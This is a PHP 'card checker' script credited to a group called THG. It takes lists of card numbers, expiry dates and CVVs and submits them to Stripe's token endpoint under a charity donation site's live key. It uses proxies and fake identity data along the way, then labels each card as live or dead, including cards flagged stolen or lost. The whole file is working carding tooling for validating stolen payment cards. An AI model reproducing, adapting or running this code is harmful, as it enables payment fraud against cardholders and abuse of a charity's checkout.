<?php

////////////[The Holy Grail]//////////

// ========= [ THG Family ] ========= // 

// ========= [ Venz ] ========= // 
// ========= [ Code ] ========= // 
// ========= [ Suzy ] ========= //
// ========= [ Pogi ] ========= //
// ========= [ Void ] ========= //
// ========= [ Jobert ] ========= // 
// ========= [ notflory ]========= //
// ========= [ Nontiquid ] ========= //
// ========= [ Blueeeming ] ========= //

////////////[1 Curl Template]////////////

error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

///////////////[Functions]///////////////

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}


/////////[Credentials Randomizer]////////

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

///////////////[Variables]///////////////

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$amount = 'Charge : $'.rand(4,7).'.'.rand(01,99);
$amount2 = 'Not Charged';
$time = rand(00000,99999);
$ttc = 'TTC : '.rand(0,1).'.'.rand(1,9).'s';

/////////////[Rotating Proxy]///////////

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "$super_proxy");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");

/////////////[Socks Proxy]//////////////

curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

///////////////[Headers]////////////////

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-d9c7a6534235532343003542b4692fd9.html?distinct_id=b9029b6f-632a-9f77-6797-6175d93496bb',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

///////////////[Postfield]///////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$name.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.autismtas.org.au%2Fdonate%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Granger+Man&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]=NY&card[address_zip]=10002&card[address_country]=United+States&time_on_page=84513&guid=NA&muid=9de3f742-3fd8-46db-b3a0-ec9aa0c3f416&sid=983878fb-dc4c-4e48-a7ce-bba7f333892e&key=pk_live_1ZncPTIkGssLekQxFnjkogTd');

////////////////[JSON D-CODE]///////////////

$result = curl_exec($ch);
                                        $resulta = json_decode($result, 1);
                                        curl_close($ch);

$err = '[Message] '.$resulta["error"]["message"].' [D-Code] '.$resulta["error"]["decline_code"];

///////////////[Response]////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV) /span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"The zip code you supplied failed validation.")){
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV - Zip failed validation)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Fraudulent Card</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (͏CVV)</span> </span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Insufficient Funds</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Insufficient Funds</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Lost Card</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Stolen Card </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (CCN) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning">Approved (CCN) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> 「Approved (CCN) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Pickup Card (Reported Stolen Or Lost) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Expired Card</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Expired Card </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Incorrect Card Number</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Incorrect Card Number </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> Service Not Allowed</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif (strpos($result, '"cvc_check": "unavailable"')) {
echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> [Message] CVC Check [D-Code] Unavailable </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';

}
elseif(strpos($result, "error")) {
    echo '<span class="badge badge-danger">#DIE</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> '.$err.'</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';

}
else {
    echo '<span class="badge badge-danger">#DIED</span></span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> THG </span> <span class="badge badge-warning"> '.$err.' </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
////////////////////////////////////////

ob_flush();

//////////////[Echo Result]///////////
//echo $result;

///////////////////////////////////////////////================ Edited By THG ================
///////////////////////////////////////////////

?>
